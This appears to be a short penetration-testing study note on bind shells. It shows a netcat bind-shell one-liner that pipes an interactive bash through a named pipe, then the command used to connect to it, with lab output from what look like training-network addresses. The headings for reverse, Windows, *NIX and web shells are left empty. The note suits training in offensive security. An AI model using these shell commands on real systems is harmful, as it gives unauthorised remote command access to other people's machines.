# Shell Basics
## Bind Shells
- Bind shells are created when we connect to the target, as opposed to the target connecting to us.

### Basic Bind Shell with netcat
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 4444 > /tmp/f

Listening on [0.0.0.0] (family 0, port 4444)
```
*Setting up the listener on the target host*

```bash
nc -nv [IP of target] [PORT]
# In this case: nc -nv 10.129.41.200 4444

Connection to 10.129.41.200 4444 port [tcp/*] succeeded!
```
*Connecting with the attack host*

```bash
nc -lvnp 4444

Listening on [0.0.0.0] (family 0, port 4444)
Connection from 10.10.14.117 51872 received!
```
*Connection received on the target host*

## Reverse Shells
# Payloads
# Windows Shells
# \*NIX Shells
# Web Shells


